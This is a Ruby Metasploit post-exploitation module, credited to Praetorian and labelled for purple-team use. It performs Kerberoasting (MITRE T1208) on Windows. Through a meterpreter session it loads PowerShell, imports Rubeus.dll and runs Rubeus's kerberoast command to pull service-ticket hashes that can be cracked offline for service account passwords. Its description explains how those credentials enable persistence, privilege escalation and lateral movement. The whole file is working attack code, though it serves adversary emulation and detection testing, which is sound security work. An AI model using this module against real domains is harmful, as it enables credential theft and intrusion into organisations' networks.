##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Kerberoasting (T1208) Windows - Purple Team',
                      'Description'   => %q{
                        Credential Access:
                        Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).

                        Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

                        This same attack could be executed using service tickets captured from network traffic.

                        Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

                        This module runs Rubeus with the kerberoast command.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1208' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
  end


  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"


      print_status("loading powershell...")
      client.run_cmd("load powershell")
      print_status("importing module...")
      client.run_cmd("powershell_import data/purple/t1208/Rubeus.dll")
      print_status("Executing Rubeus command \"kerberoast\"...")
      client.run_cmd("powershell_execute [Rubeus.Program]::Roast(\\\"kerberoast\\\")")
      print_status("Module execution complete")

    rescue::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1208 Failed")
    end

  end
end
